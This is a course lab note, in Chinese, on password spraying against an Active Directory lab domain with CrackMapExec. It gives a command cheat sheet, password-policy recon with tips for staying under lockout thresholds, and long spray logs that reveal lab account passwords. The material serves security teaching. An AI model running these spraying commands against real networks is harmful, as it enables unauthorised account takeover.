---
title: NTUSTISC - AD Note - Lab(Password Spraying)
tags: [NTUSTISC, AD, information security]

category: "Security/Course/NTUST ISC/AD/3. 更多密碼"
---

# NTUSTISC - AD Note - Lab(Password Spraying)
[TOC]

Lecture Video: [2022/05/04 AD 安全1](https://youtu.be/Cv2gNQkDM8Q?si=l1na5hFGpAPk6Uux&t=4257)

## Background
* 密碼收集
    * SAM.hive(Security Account Manager)
    * Password Spraying(用猜的)
        * 和brute force差在哪裡呢?其實概念一樣，只是角度不一樣，brute force是針對一隻帳號，用很多的密碼去猜；而password spraying則是用一組密碼去爆所有的帳號，其實就是反過來
        * Tool: [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec) - 結合各種功能的內網滲透神器
    * GPO
    * 記憶體(lsass)
## Lab
### ==Password Spraying==
1. How to use?
    * Cheat Sheet
        ```bash
        $ crackmapexec <protocol> <target(s)> -u <a file or string only> -p <a file or string only>

        # For example
        $ crackmapexec smb 10.10.10.100 -u administrator -p Passw0rd
        $ crackmapexec smb 10.10.10.100 -u ~/file_usernames -p ~/file_passwords
        $ crackmapexec smb 10.10.10.100 -u administrator -p Passw0rd --local-auth
        $ crackmapexec smb <filename> -u administrator -p Passw0rd --local-auth
        ```
        `--local-auth`代表是用本機帳號的角度登入，就不是用domain admin的角度登入
2. Recon Password Policy
    在PowerShell中使用`$ Get-ADDefaultDomainPasswordPolicy`調查Domain上的密碼原則，Note: ==Win2016要打開==
    ```bash
    $ Get-ADDefaultDomainPasswordPolicy                                                        

    ComplexityEnabled           : False
    DistinguishedName           : DC=kuma,DC=org
    LockoutDuration             : 00:01:00
    LockoutObservationWindow    : 00:01:00
    LockoutThreshold            : 0
    MaxPasswordAge              : 00:00:00
    MinPasswordAge              : 00:00:00
    MinPasswordLength           : 4
    objectClass                 : {domainDNS}
    objectGuid                  : 29531761-1cf9-452c-8ee7-d5056e01d82b
    PasswordHistoryCount        : 24
    ReversibleEncryptionEnabled : False
    ```
    要注意的地方：
    * LockoutThreshold: 可以錯誤嘗試的次數，0就代表沒有設定，可以無限次數的爆破，如果有設定例如5，那可能就要修改攻擊策略，可能每天不能試超過兩次之類的，讓原使用者也還有容錯的空間可以登入
    * MinPasswordLength: 大多數使用者會遵從最小密碼原則，如果要猜密碼就可以嘗試從四位密碼以上開始猜
3. Check IP
    首先我們要先看一下AD的IP為多少，通常我們要做這種password spraying都是對著AD，所以我們要先尋找目標
    ```bash
    $ ipconfig

    Windows IP Configuration


    Ethernet adapter Ethernet0:

       Connection-specific DNS Suffix  . : localdomain
       Link-local IPv6 Address . . . . . : fe80::651f:6e78:505f:75f%5
       IPv4 Address. . . . . . . . . . . : 192.168.222.128
       Subnet Mask . . . . . . . . . . . : 255.255.255.0
       Default Gateway . . . . . . . . . : 192.168.222.2

    Tunnel adapter isatap.localdomain:

       Media State . . . . . . . . . . . : Media disconnected
       Connection-specific DNS Suffix  . : localdomain
    ```
    IP: `192.168.222.128`
4. 在Kali使用CrackMapExec
    ```bash
    $ crackmapexec smb 192.168.222.128/24 -u administrator -p 1qaz@WSX3edc             
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [*] Windows 10.0 Build 18362 x64 (name:DESKTOP-G95U93T) (domain:kuma.org) (signing:False) (SMBv1:False)
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:WIN-818G5VCOLJO) (domain:kuma.org) (signing:True) (SMBv1:True)
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [+] kuma.org\administrator:1qaz@WSX3edc (Pwn3d!)
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [+] kuma.org\administrator:1qaz@WSX3edc (Pwn3d!)
    ```
    可以看到這個網段底下的確有兩個主機的密碼被Pwn出來
5. Lab
    ==找出使用預設密碼(Changeme123!)的使用者
    找出使用(ncc1701)作為密碼的使用者==

    我先試著用前面提到的leak password from description中找到的兩組密碼實際測試看看
    帳密一、Lina Allene→`r2NE4/9:F;[k`
    帳密二、Fara Iseabal→`8F%kJ2q_cVFg`
    :::spoiler Result of Lina
    ```bash
    $ crackmapexec smb 192.168.222.128/24 -u ./AD-user.txt -p r2NE4/9:F\;\[k
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [*] Windows 10.0 Build 18362 x64 (name:DESKTOP-G95U93T) (domain:kuma.org) (signing:False) (SMBv1:False)
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:WIN-818G5VCOLJO) (domain:kuma.org) (signing:True) (SMBv1:True)
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\Administrator:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\aleda.appolonia:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\alikee.perri:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\aloise.elfrida:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\amabelle.gayle:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\andree.suki:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\angelique.hilda:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\annice.eden:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\anya.gypsy:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\audi.rosalind:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\babb.joanne:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\bambi.etta:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\bear:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\berget.celka:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\berna.raphaela:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\berny.kirby:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\bill.marylee:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\caitrin.latia:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\carey.kincaid:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\carlye.chloette:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\carmelle.libbi:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\casandra.cherrita:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\casi.hyacinth:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\cassondra.lothario:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\celeste.kelci:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\charis.kory:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\christi.nettle:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\coraline.mahalia:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\corine.celesta:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\cyndie.rhodie:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\daile.odetta:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\darlleen.dorisa:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\DefaultAccount:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\dollie.fayina:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\dominica.carmon:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\dorrie.paolina:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\eba.luca:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\ella.randee:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\erena.elinore:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\fara.iseabal:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\fred.carmita:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\gabriel.diannne:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\garnet.constancia:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\gertrude.felecia:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\gillian.marsiella:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\giulietta.moyra:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\glenda.dorrie:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\Guest:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\henrieta.sabine:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\herminia.debby:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\issy.eudora:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\jerrie.morganne:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\jessa.corinna:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\jori.floria:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\joyann.sibella:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\kaja.brenda:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\karoly.nadeen:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\katee.annemarie:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\katharina.alyssa:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\kiri.kath:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\kizzee.margaux:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\krbtgt:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\laurena.mirelle:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\lazaro.karoly:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\lilas.lindy:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\lily.kristofor:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [+] kuma.org\lina.allene:r2NE4/9:F;[k 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\Administrator:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\aleda.appolonia:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\alikee.perri:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\aloise.elfrida:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\amabelle.gayle:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\andree.suki:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\angelique.hilda:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\annice.eden:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\anya.gypsy:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\audi.rosalind:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\babb.joanne:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\bambi.etta:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\bear:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\berget.celka:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\berna.raphaela:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\berny.kirby:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\bill.marylee:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\caitrin.latia:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\carey.kincaid:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\carlye.chloette:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\carmelle.libbi:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\casandra.cherrita:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\casi.hyacinth:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\cassondra.lothario:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\celeste.kelci:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\charis.kory:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\christi.nettle:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\coraline.mahalia:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\corine.celesta:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\cyndie.rhodie:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\daile.odetta:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\darlleen.dorisa:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\DefaultAccount:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\dollie.fayina:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\dominica.carmon:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\dorrie.paolina:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\eba.luca:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\ella.randee:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\erena.elinore:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\fara.iseabal:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\fred.carmita:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\gabriel.diannne:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\garnet.constancia:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\gertrude.felecia:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\gillian.marsiella:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\giulietta.moyra:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\glenda.dorrie:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\Guest:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\henrieta.sabine:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\herminia.debby:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\issy.eudora:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\jerrie.morganne:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\jessa.corinna:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\jori.floria:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\joyann.sibella:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\kaja.brenda:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\karoly.nadeen:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\katee.annemarie:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\katharina.alyssa:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\kiri.kath:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\kizzee.margaux:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\krbtgt:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\laurena.mirelle:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\lazaro.karoly:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\lilas.lindy:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\lily.kristofor:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [+] kuma.org\lina.allene:r2NE4/9:F;[k
    ```
    的確是lina.allene的密碼
    :::
    :::spoiler Result of Fara
    ```bash
    $ crackmapexec smb 192.168.222.128/24 -u ./AD-user.txt -p 8F%kJ2q_cVFg                 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:WIN-818G5VCOLJO) (domain:kuma.org) (signing:True) (SMBv1:True)
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [*] Windows 10.0 Build 18362 x64 (name:DESKTOP-G95U93T) (domain:kuma.org) (signing:False) (SMBv1:False)
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\Administrator:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\aleda.appolonia:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\alikee.perri:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\aloise.elfrida:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\amabelle.gayle:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\andree.suki:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\angelique.hilda:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\annice.eden:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\anya.gypsy:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\audi.rosalind:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\babb.joanne:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\bambi.etta:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\bear:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\berget.celka:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\berna.raphaela:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\berny.kirby:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\bill.marylee:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\caitrin.latia:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\carey.kincaid:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\carlye.chloette:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\carmelle.libbi:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\casandra.cherrita:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\casi.hyacinth:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\cassondra.lothario:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\celeste.kelci:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\charis.kory:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\christi.nettle:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\coraline.mahalia:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\corine.celesta:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\cyndie.rhodie:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\daile.odetta:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\darlleen.dorisa:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\DefaultAccount:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
